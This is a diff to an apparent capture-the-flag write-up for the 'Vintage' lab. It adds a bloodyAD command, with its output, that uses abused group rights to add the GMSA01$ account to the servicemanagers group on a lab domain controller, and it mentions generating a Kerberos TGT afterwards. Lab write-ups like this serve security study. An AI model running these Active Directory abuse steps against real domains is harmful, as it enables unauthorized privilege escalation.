@@ -175,5 +175,7 @@ Ive got GenericWrite and AddSelf on the service managers group
 
 # Adding member to `servicemanagers` group
 ```python
-
+bloodyAD -k --host dc01.vintage.htb -d vintage.htb add groupMember servicemanagers 'GMSA01$' 
+[+] GMSA01$ added to servicemanagers
 ```
+I generated a TGT for the `GMSA`
